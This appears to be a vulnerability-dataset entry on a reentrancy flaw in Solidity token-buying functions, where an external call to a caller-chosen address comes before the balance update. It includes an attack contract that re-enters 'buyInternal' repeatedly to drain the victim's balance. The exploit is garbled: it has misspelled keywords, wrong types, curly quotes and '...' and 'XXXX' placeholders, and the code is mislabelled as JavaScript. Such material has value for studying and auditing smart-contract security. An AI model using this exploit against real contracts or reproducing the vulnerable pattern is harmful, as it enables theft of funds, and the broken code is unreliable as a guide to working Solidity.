## Vulnerable Code

```javascript
**Instance_1**
function buyInternal(
        ERC20 token,
        address _exchange,
        uint256 _value,
        bytes _data
    ) 
        internal
    {
        require(
            // 0xa9059cbb - transfer(address,uint256)
            !(_data[0] == 0xa9 && _data[1] == 0x05 && _data[2] == 0x9c && _data[3] == 0xbb) &&
            // 0x095ea7b3 - approve(address,uint256)
            !(_data[0] == 0x09 && _data[1] == 0x5e && _data[2] == 0xa7 && _data[3] == 0xb3) &&
            // 0x23b872dd - transferFrom(address,address,uint256)
            !(_data[0] == 0x23 && _data[1] == 0xb8 && _data[2] == 0x72 && _data[3] == 0xdd),
            "buyInternal: Do not try to call transfer, approve or transferFrom"
        );
        uint256 tokenBalance = token.balanceOf(this);
        require(_exchange.call.value(_value)(_data));        //Vulnerable position
        balances[msg.sender] = balances[msg.sender].sub(_value);
        tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token]
            .add(token.balanceOf(this).sub(tokenBalance));
    }
    
    
**Instance_2**
function buyOne(
        ERC20 token,
        address _exchange,
        uint256 _value,
        bytes _data
        ) 
        payable
        public
        {
        balances[msg.sender] = balances[msg.sender].add(msg.value);
        uint256 tokenBalance = token.balanceOf(this);
        require(_exchange.call.value(_value)(_data));
        balances[msg.sender] = balances[msg.sender].sub(_value);
        tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token]
            .add(token.balanceOf(this).sub(tokenBalance));
}
```



## Exploit Code

```javascript
Contract Attack is XXXX{
    uint count;
    address victimAddress;
    bytes  bs4 = new bytes(4);
    bytes4 functionSignature = bytes4(keccak256("startAttack()"));
    function setVictim(address  _victim){
        victimAddress = _victim;
    }
    funciton startAttack() payable{
        for (uint i = 0; i< bs4.length; i++){
            bs4[i] = functionSignature[i];
        }
        count++;
        if(count < 5){
            victimAddress.call(byte4(keccak256(“buyInternal(ERC20, address, uint256, bytes)”)), ..., this, ..., bs4);
        }
    }
    function() payable{

    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position_2: IF the paramete of '_exchange' is transformed from a malicious address, the method of "startAttack" can be a malicious function to reentrancy.Every single re-entry the comment of vulnerability position_1 will pick up the balance of Victim. ps:"...." represent an appropriate paramete.'XXXX' represents the Vulnerability contracts's name
